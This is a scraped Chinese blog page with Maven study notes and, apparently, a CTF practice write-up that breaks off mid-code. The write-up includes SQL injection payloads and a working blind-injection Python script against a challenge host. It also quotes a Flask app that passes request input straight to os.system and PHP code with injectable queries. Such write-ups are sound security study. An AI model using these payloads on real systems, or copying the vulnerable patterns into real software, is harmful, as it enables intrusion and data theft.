<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/06/de1ctf2020/">http://blog.ccreater.top/2020/05/06/de1ctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/06/de1ctf2020/" data-id="cka3ckr2p001xv4v03kj693i4" data-title="de1ctf2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-maven学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2020-05-05T15:05:50.005Z" itemprop="datePublished">2020-05-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">maven学习笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="maven学习笔记"><a href="#maven学习笔记" class="headerlink" title="maven学习笔记"></a>maven学习笔记</h1><h2 id="学习网站"><a href="#学习网站" class="headerlink" title="学习网站"></a>学习网站</h2><p> <a href="https://www.imooc.com/learn/443" target="_blank" rel="noopener">https://www.imooc.com/learn/443</a> (这个挺好的)</p>
<p> <a href="https://www.runoob.com/maven/maven-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-tutorial.html</a> </p>
<h2 id="maven功能"><a href="#maven功能" class="headerlink" title="maven功能"></a>maven功能</h2><ul>
<li>构建</li>
<li>文档生成</li>
<li>报告</li>
<li>依赖</li>
<li>SCMs</li>
<li>发布</li>
<li>分发</li>
<li>邮件列表</li>
</ul>
<h2 id="约定配置"><a href="#约定配置" class="headerlink" title="约定配置"></a>约定配置</h2><p>Maven 提倡使用一个共同的标准目录结构，Maven 使用约定优于配置的原则，大家尽可能的遵守这样的目录结构。如下所示：</p>
<table>
<thead>
<tr>
<th align="left">目录</th>
<th align="left">目的</th>
</tr>
</thead>
<tbody><tr>
<td align="left">${basedir}</td>
<td align="left">存放pom.xml和所有的子目录</td>
</tr>
<tr>
<td align="left">${basedir}/src/main/java</td>
<td align="left">项目的java源代码</td>
</tr>
<tr>
<td align="left">${basedir}/src/main/resources</td>
<td align="left">项目的资源，比如说property文件，springmvc.xml</td>
</tr>
<tr>
<td align="left">${basedir}/src/test/java</td>
<td align="left">项目的测试类，比如说Junit代码</td>
</tr>
<tr>
<td align="left">${basedir}/src/test/resources</td>
<td align="left">测试用的资源</td>
</tr>
<tr>
<td align="left">${basedir}/src/main/webapp/WEB-INF</td>
<td align="left">web应用文件目录，web项目的信息，比如存放web.xml、本地图片、jsp视图页面</td>
</tr>
<tr>
<td align="left">${basedir}/target</td>
<td align="left">打包输出目录</td>
</tr>
<tr>
<td align="left">${basedir}/target/classes</td>
<td align="left">编译输出目录</td>
</tr>
<tr>
<td align="left">${basedir}/target/test-classes</td>
<td align="left">测试编译输出目录</td>
</tr>
<tr>
<td align="left">Test.java</td>
<td align="left">Maven只会自动运行符合该命名规则的测试类</td>
</tr>
<tr>
<td align="left">~/.m2/repository</td>
<td align="left">Maven默认的本地仓库目录位置</td>
</tr>
</tbody></table>
<h2 id="Maven-POM"><a href="#Maven-POM" class="headerlink" title="Maven POM"></a>Maven POM</h2><p> POM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件 ,用于描述如何构建项目</p>
<p>在创建 POM 之前，我们首先需要描述项目组 (groupId), 项目的唯一ID。 </p>
<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;
    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0
    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;

    &lt;!-- 模型版本 --&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;
    &lt;groupId&gt;com.companyname.project-group(公司网站反写+项目名)&lt;/groupId&gt;

    &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;
    &lt;artifactId&gt;project+模块名&lt;/artifactId&gt;

    &lt;!-- 版本号 --&gt;
    &lt;version&gt;1.0&lt;/version&gt;
&lt;/project&gt;</code></pre>
<h3 id="常见标签解释"><a href="#常见标签解释" class="headerlink" title="常见标签解释"></a>常见标签解释</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;
    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0
    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;

    &lt;!-- 模型版本 --&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;
    &lt;groupId&gt;com.companyname.project-group(公司网站反写+项目名)&lt;/groupId&gt;

    &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;
    &lt;artifactId&gt;project+模块名&lt;/artifactId&gt;

    &lt;!-- 版本号
     第一个数字表示大版本号
    第二个数字表示分支版本号
    第三个数字表示小版本号
    snapshot 快照
    alpha 内部测试
    beta 公测
    Release 稳定版本
    GA 正式发布
    --&gt;
    &lt;version&gt;1.0.0-xxx&lt;/version&gt;
    &lt;!-- 打包方式，默认是jar,还有:war zip pom--&gt;
    &lt;packaging&gt;&lt;/packaging&gt;
    &lt;!--项目描述名--&gt;
    &lt;name&gt;&lt;/name&gt;
    &lt;!--项目地址 --&gt;
    &lt;url&gt;&lt;/url&gt;
    &lt;!--项目描述 --&gt;
    &lt;descriptions&gt;&lt;/descriptions&gt;
    &lt;!--开发人员信息 --&gt;
    &lt;developers&gt;&lt;/developers&gt;
    &lt;dependeies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.companyname.project-group(公司网站反写+项目名)&lt;/groupId&gt;

            &lt;artifactId&gt;project+模块名&lt;/artifactId&gt;
            &lt;version&gt;1.0.0-xxx&lt;/version&gt;
            &lt;type&gt;&lt;/type&gt;
            &lt;!-- 在test中有用 --&gt;
            &lt;scope&gt;test&lt;/scope&gt;
            &lt;!--设置依赖是否可选，默认False，设为False则子项目默认继承，否则得显示声明--&gt;
            &lt;optional&gt;&lt;/optional&gt;
            &lt;!-- 排除依赖传递列表
                如A依赖B，B依赖C，而A不依赖C，此时就可以在此处添加C，来排除依赖
             --&gt;

            &lt;exclusions&gt;
                &lt;exclusion&gt;
                &lt;/exclusion&gt;
            &lt;/exclusions&gt;
        &lt;/dependency&gt;
    &lt;/dependeies&gt;
    &lt;!-- 依赖的管理，子pom自动继承，但是本身并不依赖 --&gt;
    &lt;dependencyManagement&gt;
       &lt;dependeies&gt;
            &lt;dependency&gt;
           &lt;/dependency&gt;
        &lt;/dependeies&gt; 
    &lt;/dependencyManagement&gt;
    &lt;build&gt;
        &lt;plugins&gt;
            &lt;!-- 详情见在某个阶段使用插件 --&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;
    &lt;!-- 聚合运行多个maven项目,一口气全部编译 --&gt;
    &lt;modules&gt;
        &lt;module&gt;
        &lt;/module&gt;
    &lt;/modules&gt;
&lt;/project&gt;</code></pre>
<h3 id="执行main函数"><a href="#执行main函数" class="headerlink" title="执行main函数"></a>执行main函数</h3><p>在pom下的project添加：</p>
<pre><code class="xml">&lt;build&gt;
 &lt;plugins&gt;
  &lt;plugin&gt;
   &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;
   &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;
   &lt;version&gt;1.1.1&lt;/version&gt;
   &lt;executions&gt;
    &lt;execution&gt;
     &lt;phase&gt;test&lt;/phase&gt;
     &lt;goals&gt;
      &lt;goal&gt;java&lt;/goal&gt;
     &lt;/goals&gt;
     &lt;configuration&gt;
      &lt;mainClass&gt;com.vineetmanohar.module.CodeGenerator&lt;/mainClass&gt;
      &lt;arguments&gt;
       &lt;argument&gt;arg0&lt;/argument&gt;
       &lt;argument&gt;arg1&lt;/argument&gt;
      &lt;/arguments&gt;
     &lt;/configuration&gt;
    &lt;/execution&gt;
   &lt;/executions&gt;
  &lt;/plugin&gt;
 &lt;/plugins&gt;
&lt;/build&gt;</code></pre>
<h3 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h3><ul>
<li>compile<br>默认的范围，编译测试运行都有效</li>
<li>provided<br>在测试和编译时有效</li>
<li>runtime<br>在测试和运行时有效</li>
<li>test<br>只有在测试中有效</li>
</ul>
<h3 id="排除依赖"><a href="#排除依赖" class="headerlink" title="排除依赖"></a>排除依赖</h3><p>在pom中的project下添加</p>
<pre><code class="xml">&lt;!-- 排除依赖传递列表
                如A依赖B，B依赖C，而A不依赖C，此时就可以在此处添加C，来排除依赖
             --&gt;

            &lt;exclusions&gt;
                &lt;exclusion&gt;
                &lt;/exclusion&gt;
            &lt;/exclusions&gt;</code></pre>
<h3 id="依赖冲突解决原则"><a href="#依赖冲突解决原则" class="headerlink" title="依赖冲突解决原则"></a>依赖冲突解决原则</h3><h4 id="短路优先"><a href="#短路优先" class="headerlink" title="短路优先"></a>短路优先</h4><pre><code>A -&gt; B -&gt; C -&gt; X1
A -&gt; D -&gt; X2
#A -&gt; D代表 A依赖于D
此时A依赖于X2</code></pre><h4 id="先声明先优先"><a href="#先声明先优先" class="headerlink" title="先声明先优先"></a>先声明先优先</h4><p>如果路径长度相同(依赖链)，则谁先声明，先解析谁</p>
<h3 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h3><p>在容器pom中修改packaging为pom，添加modules</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>现有maven项目:maven01和maven02</p>
<p>新建maven项目：maven03,三个项目均在同一个文件夹下</p>
<p>在maven03中修改packaging为pom，添加如下modules</p>
<pre><code class="xml">&lt;modules&gt;
    &lt;module&gt;
        ../maven01
    &lt;/module&gt;
    &lt;module&gt;
        ../maven02
    &lt;/module&gt;
&lt;/modules&gt;</code></pre>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>当多个maven模块都依赖一个相同的库时，多次声明显得太麻烦此时可以用继承来解决</p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>现有两个maven项目(maven01,maven02)都使用junit:3.8.1</p>
<p>新建父maven项目:maven03，其对应的pom文件为：</p>
<pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;
  &lt;artifactId&gt;maven03&lt;/artifactId&gt;
  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
  &lt;packaging&gt;pom&lt;/packaging&gt;

  &lt;name&gt;maven03&lt;/name&gt;
  &lt;url&gt;http://maven.apache.org&lt;/url&gt;

  &lt;properties&gt;
    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
  &lt;/properties&gt;


    &lt;dependencyManagement&gt;
      &lt;dependencies&gt;
        &lt;dependency&gt;
          &lt;groupId&gt;junit&lt;/groupId&gt;
          &lt;artifactId&gt;junit&lt;/artifactId&gt;
          &lt;version&gt;3.8.1&lt;/version&gt;
          &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
          &lt;/dependencies&gt;
    &lt;/dependencyManagement&gt;
&lt;/project&gt;
</code></pre>
<p>将相同的依赖都添加到dependencyManagement下，并修改packaging为pom</p>
<p>maven01和maven02的pom文件均为：</p>
<pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;
  &lt;artifactId&gt;maven02&lt;/artifactId&gt;
  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
  &lt;packaging&gt;jar&lt;/packaging&gt;

  &lt;name&gt;maven02&lt;/name&gt;
  &lt;url&gt;http://maven.apache.org&lt;/url&gt;

  &lt;properties&gt;
    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
  &lt;/properties&gt;
    &lt;parent&gt;
      &lt;groupId&gt;top.ccreater&lt;/groupId&gt;
      &lt;artifactId&gt;maven03(/maven02)&lt;/artifactId&gt;
      &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;/parent&gt;
  &lt;dependencies&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;junit&lt;/groupId&gt;
      &lt;artifactId&gt;junit&lt;/artifactId&gt;
    &lt;/dependency&gt;
  &lt;/dependencies&gt;
&lt;/project&gt;
</code></pre>
<h3 id="Super-POM"><a href="#Super-POM" class="headerlink" title="Super POM"></a>Super POM</h3><p>所有的 POM 都继承自一个父 POM（无论是否显式定义了这个父 POM）。父 POM 也被称作 <strong>Super POM</strong>，它包含了一些可以被继承的默认设置。</p>
<p>Maven 使用 effective pom（Super pom 加上工程自己的配置）来执行相关的目标，它帮助开发者在 pom.xml 中做尽可能少的配置，当然这些配置可以被方便的重写。</p>
<p>查看 Super POM 默认配置的一个简单方法是执行以下命令：<strong>mvn help:effective-pom</strong> （需要在当前目录下新建一个pom.xml）</p>
<h3 id="POM-标签详解"><a href="#POM-标签详解" class="headerlink" title="POM 标签详解"></a>POM 标签详解</h3><p><a href="https://www.runoob.com/maven/maven-pom.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-pom.html</a></p>
<h2 id="Maven-构建生命周期"><a href="#Maven-构建生命周期" class="headerlink" title="Maven 构建生命周期"></a>Maven 构建生命周期</h2><p> Maven 构建生命周期定义了一个项目构建跟发布的过程。 </p>
<p>Maven 有以下三个标准的生命周期：</p>
<ul>
<li><strong>clean</strong>：项目清理的处理</li>
<li><strong>default(或 build)</strong>：项目部署的处理</li>
<li><strong>site</strong>：项目站点文档创建的处理</li>
</ul>
<h3 id="典型的生命构建周期"><a href="#典型的生命构建周期" class="headerlink" title="典型的生命构建周期"></a>典型的生命构建周期</h3><table>
<thead>
<tr>
<th align="left">阶段</th>
<th align="left">处理</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">验证 validate</td>
<td align="left">验证项目</td>
<td align="left">验证项目是否正确且所有必须信息是可用的</td>
</tr>
<tr>
<td align="left">编译 compile</td>
<td align="left">执行编译</td>
<td align="left">源代码编译在此阶段完成</td>
</tr>
<tr>
<td align="left">测试 Test</td>
<td align="left">测试</td>
<td align="left">使用适当的单元测试框架（例如JUnit）运行测试。</td>
</tr>
<tr>
<td align="left">包装 package</td>
<td align="left">打包</td>
<td align="left">创建JAR/WAR包如在 pom.xml 中定义提及的包</td>
</tr>
<tr>
<td align="left">检查 verify</td>
<td align="left">检查</td>
<td align="left">对集成测试的结果进行检查，以保证质量达标</td>
</tr>
<tr>
<td align="left">安装 install</td>
<td align="left">安装</td>
<td align="left">安装打包的项目到本地仓库，以供其他项目使用</td>
</tr>
<tr>
<td align="left">部署 deploy</td>
<td align="left">部署</td>
<td align="left">拷贝最终的工程包到远程仓库中，以共享给其他开发人员和工程</td>
</tr>
</tbody></table>
<p>如果执行package，那么clean,test等都会被执行</p>
<h3 id="构建阶段由插件目标构成"><a href="#构建阶段由插件目标构成" class="headerlink" title="构建阶段由插件目标构成"></a>构建阶段由插件目标构成</h3><p> 一个插件目标代表一个特定的任务（比构建阶段更为精细），这有助于项目的构建和管理。这些目标可能被绑定到多个阶段或者无绑定。不绑定到任何构建阶段的目标可以在构建生命周期之外通过直接调用执行。这些目标的执行顺序取决于调用目标和构建阶段的顺序。 </p>
<p>插件目标解释： 一个插件有多个目标，每个功能就是一个<em>插件目标</em>，所以一个插件有多个功能。 </p>
<h2 id="maven-常用命令"><a href="#maven-常用命令" class="headerlink" title="maven 常用命令"></a>maven 常用命令</h2><pre><code class="shell">mvn -v
mvn compile 编译
mvn test 测试
mvn package 打包项目生成jar文件
mvn clearn 删除target 目录
mvn install 安装jar包到本地仓库
创建目录的两种方式
1. 交互式
mvn archetype:generate 
2. 非交互式
mvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false</code></pre>
<h2 id="在某个阶段使用插件"><a href="#在某个阶段使用插件" class="headerlink" title="在某个阶段使用插件"></a>在某个阶段使用插件</h2><p> <a href="http://maven.apache.org/plugins" target="_blank" rel="noopener">http://maven.apache.org/plugins</a> </p>
<p>各个插件下有个example config如： <a href="http://maven.apache.org/plugins/maven-source-plugin/" target="_blank" rel="noopener">http://maven.apache.org/plugins/maven-source-plugin/</a> </p>
<p>在pom.xml文件中project下添加</p>
<pre><code class="xml">&lt;build&gt;
    &lt;plugins&gt;
      &lt;plugin&gt;
        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
        &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;
        &lt;version&gt;3.2.0&lt;/version&gt;
        &lt;!--  &lt;configuration&gt;
          &lt;outputDirectory&gt;/absolute/path/to/the/output/directory&lt;/outputDirectory&gt;
          &lt;finalName&gt;filename-of-generated-jar-file&lt;/finalName&gt;
          &lt;attach&gt;false&lt;/attach&gt;
        &lt;/configuration&gt;--&gt;
        &lt;executions&gt;
            &lt;execution&gt;
                &lt;phase&gt;package&lt;/phase&gt;
                &lt;goals&gt;
                &lt;goal&gt;jar-no-fork&lt;/goal&gt;
                &lt;!-- 在package阶段执行source:jar-no-fork --&gt;
            &lt;/goals&gt;
            &lt;/execution&gt;

        &lt;/executions&gt;
      &lt;/plugin&gt;
    &lt;/plugins&gt;
  &lt;/build&gt;</code></pre>
<h2 id="maven配置文件"><a href="#maven配置文件" class="headerlink" title="maven配置文件"></a>maven配置文件</h2><h3 id="添加镜像仓库"><a href="#添加镜像仓库" class="headerlink" title="添加镜像仓库"></a>添加镜像仓库</h3><p>在mirrors下添加</p>
<pre><code class="xml">&lt;mirror&gt;
        &lt;id&gt;alimaven&lt;/id&gt;
        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;&lt;!-- 哪个仓库的镜像，利用*来匹配所有仓库 --&gt;
        &lt;name&gt;aliyun maven&lt;/name&gt;
        &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;
    &lt;/mirror&gt;
    &lt;mirror&gt;
        &lt;id&gt;jcenter&lt;/id&gt;
        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;name&gt;jcenter.bintray.com&lt;/name&gt;
        &lt;url&gt;http://jcenter.bintray.com/&lt;/url&gt;
    &lt;/mirror&gt;

    &lt;mirror&gt;
        &lt;id&gt;repo1&lt;/id&gt;
        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;
        &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;
    &lt;/mirror&gt;
    &lt;mirror&gt;
        &lt;id&gt;repo2&lt;/id&gt;
        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;
        &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt;
    &lt;/mirror&gt;</code></pre>
<h3 id="修改本地仓库地址"><a href="#修改本地仓库地址" class="headerlink" title="修改本地仓库地址"></a>修改本地仓库地址</h3><p>修改<code>&lt;localRepository&gt;E:/apache-maven-3.6.3/repository&lt;/localRepository&gt;</code></p>
<h2 id="常用插件介绍"><a href="#常用插件介绍" class="headerlink" title="常用插件介绍"></a>常用插件介绍</h2><p> jetty : servlet 本地测试插件</p>
<p> <a href="http://tomcat.apache.org/maven-plugin.html" target="_blank" rel="noopener">tomcat</a>  :  tomcat  本地测试插件</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/05/maven学习笔记/">http://blog.ccreater.top/2020/05/05/maven学习笔记/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cka3ckr30002qv4v09us3aug4" data-title="maven学习笔记" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-4月做题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/" class="article-date">
  <time class="dt-published" datetime="2020-05-05T02:01:58.175Z" itemprop="datePublished">2020-05-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/">4月做题</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="4月做题"><a href="#4月做题" class="headerlink" title="4月做题"></a>4月做题</h1><h2 id="happyctfd"><a href="#happyctfd" class="headerlink" title="happyctfd"></a>happyctfd</h2><p>刚开始看这个非常怕…后来谷歌了一下ctfd的cve直接打穿,这题就是弟弟</p>
<p> <a href="https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0" target="_blank" rel="noopener">https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0</a> </p>
<p>登陆后台后把数据导出就拿到flag了</p>
<p><code>flag{1b236e8e-8f64-461d-a973-7059e706aeec}</code></p>
<h2 id="finalsql"><a href="#finalsql" class="headerlink" title="finalsql"></a>finalsql</h2><p>有两处注入点</p>
<p>第一处:</p>
<p><code>/search.php?id=1</code></p>
<p>黑名单:<code>hex,if, ,and</code></p>
<p>payload:<code>/search.php?id=1/(((select(ord(substr(group_concat(table_name),20,1)))from(information_schema.tables)where(table_schema=database()))-31)&gt;0)</code></p>
<p>盲注脚本:</p>
<pre><code class="python">import requests
import time
#修改bigger和sqlinj就好


#实现bigger才能使用
def findByDichotomy(begin,end):
    max_num=end
    while True:
        mid=int((begin+end)/2)
        if begin==max_num:
            return False
        if begin==end:
            return begin
        if end-begin==1:
            if bigger(begin):
                return end
            else:
                return begin
        if bigger(mid):
            begin=mid+1
        else:
            end=mid

#待求数据大于num
def bigger(num):
    return sqlinj(num)
def less(num):
    pass
def equal(num):
    pass

def sqlinj(num):


    burp0_url = &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn:80/search.php?id=1/(((select(ord(substr(group_concat(username,&#39;,&#39;,password),POS,1)))from(F1naI1y))-GUESS)&gt;0)&quot;.replace(&quot;GUESS&quot;,str(num)).replace(&quot;POS&quot;,str(pos))
    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    res=requests.get(burp0_url, headers=burp0_headers)
    time.sleep(0.5)
    print(&quot;test &quot;,num)
    if &quot;NO! Not this! Click others~~~&quot; in res.text:
        return True
    else:
        return False


result=&quot;mygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site&quot;
pos=len(result)+1
while True:
    num=findByDichotomy(32,128)
    if num is False:
        print(result)
        break
    result+=chr(num)
    print(result)
    pos+=1</code></pre>
<p>数据库:information_schema,test,performance_schema,mysql,geek</p>
<pre><code>F1naI1y,Flaaaaag

Flaaaaag:id,fl4gaws

F1naI1y:id,username,password

mygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,Syc,welcom_to_Syclover,finally,cl4y_really_need_a_grilfriend,flag,flag{2e7c980e-7fff-443b-8d1a-1371eaa326ba}</code></pre><p>测试后第二次发现不如第一处好用,就不写了</p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><pre><code class="python">
from flask import Flask, request
import os
app = Flask(__name__)

flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)
# flag = flag_file.read()
# flag_file.close()
#
# @app.route(&#39;/flag&#39;)
# def flag():
#     return flag
## want flag? naive!

# You will never find the thing you want:) I think
@app.route(&#39;/shell&#39;)
def shell():
    os.system(&quot;rm -f flag.txt&quot;)
    exec_cmd = request.args.get(&#39;c&#39;)
    os.system(exec_cmd)
    return &quot;1&quot;

@app.route(&#39;/&#39;)
def source():
    return open(&quot;app.py&quot;,&quot;r&quot;).read()

if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;)
</code></pre>
<p>去fd找flag</p>
<p><code>flag{7410ef7f-b10e-4da4-9beb-29f304fec028}</code></p>
<p>so easy</p>
<h2 id="blanklist"><a href="#blanklist" class="headerlink" title="blanklist"></a>blanklist</h2><p>堆叠注入,handle代替select</p>
<p><code>flag{dad3eb12-8877-4ea8-8bfe-98ac99a93715}</code></p>
<h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><pre><code class="php">&lt;?php
#这不是抽奖程序的源代码！不许看！
header(&quot;Content-Type: text/html;charset=utf-8&quot;);
session_start();
if(!isset($_SESSION[&#39;seed&#39;])){
$_SESSION[&#39;seed&#39;]=rand(0,999999999);
}

mt_srand($_SESSION[&#39;seed&#39;]);
$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
$str=&#39;&#39;;
$len1=20;
for ( $i = 0; $i &lt; $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;


if(isset($_POST[&#39;num&#39;])){
    if($_POST[&#39;num&#39;]===$str){x
        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;;
    }
    else{
        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;
    }
}
show_source(&quot;check.php&quot;);</code></pre>
<p>用php_mt_rand来爆破</p>
<p><code>flag{1c171630-aee4-400c-b629-a9e457cbe15e}</code></p>
<p>一定要去<code>https://www.openwall.com/php_mt_seed/</code>下载,不要去github的镜像下载,把我坑死了</p>
<h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><pre><code class="php">&lt;?php
include &quot;mysql.php&quot;;
session_start();
if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){
    header(&quot;Location: ./login.php&quot;);
    die();
}
if(isset($_GET[&#39;do&#39;])){
switch ($_GET[&#39;do&#39;])
{
case &#39;write&#39;:
    $category = addslashes($_POST[&#39;category&#39;]);
    $title = addslashes($_POST[&#39;title&#39;]);
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into board
            set category = &#39;$category&#39;,
                title = &#39;$title&#39;,
                content = &#39;$content&#39;&quot;;#category=result&#39; ,bo_id=&#39;1\
    $result = mysql_query($sql);
    header(&quot;Location: ./index.php&quot;);
    break;
